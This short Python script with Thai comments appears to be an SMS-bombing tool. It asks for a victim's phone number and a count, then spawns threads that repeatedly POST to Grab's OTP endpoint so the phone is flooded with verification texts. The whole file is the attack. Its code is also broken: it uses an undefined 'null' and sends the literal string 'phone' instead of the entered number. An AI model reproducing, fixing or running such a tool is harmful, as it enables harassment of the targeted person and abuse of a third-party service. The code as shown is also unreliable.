import requests
import threading
from threading import Thread
import time
import colorama
import platform
import os

def clear():# ไว้เช็ค os ที่ใช้
    so_name=platform.system()#ไว้เช็ค os
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()

phone = input("\033[91mPHONE NUMBER : ")
number = int(input("\033[91mNUMBER : "))
clear()

def api1():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp",data={"client_id":"4ddf78ade8324462988fec5bfc5874c2","ctx_id":"4f89934de7fc4eb1852f1b739fe2f508","transaction_ctx":null,"country_code":"TH","method":"SMS","num_digits":6,"scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":"phone"})
    
for i in range(number):
    time.sleep(0.6)
    threading.Thread(target=api1).start()
    print("\33[92m API GRAD")